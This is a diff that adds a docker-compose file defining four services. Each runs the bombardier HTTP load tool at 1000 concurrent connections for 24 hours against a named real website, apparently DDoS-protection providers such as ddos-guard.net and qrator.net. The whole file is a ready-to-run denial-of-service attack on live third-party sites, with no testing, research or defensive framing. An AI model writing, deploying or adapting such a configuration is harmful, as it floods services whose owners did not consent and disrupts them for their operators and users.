@@ -1,0 +1,14 @@
+version: "3.9"
+services:
+  ddos_guards_1:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://ddos-guard.net/ru"
+  ddos_guards_2:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://stormwall.pro"
+  ddos_guards_3:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://qrator.net/ru"
+  ddos_guards_4:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://solidwall.ru"
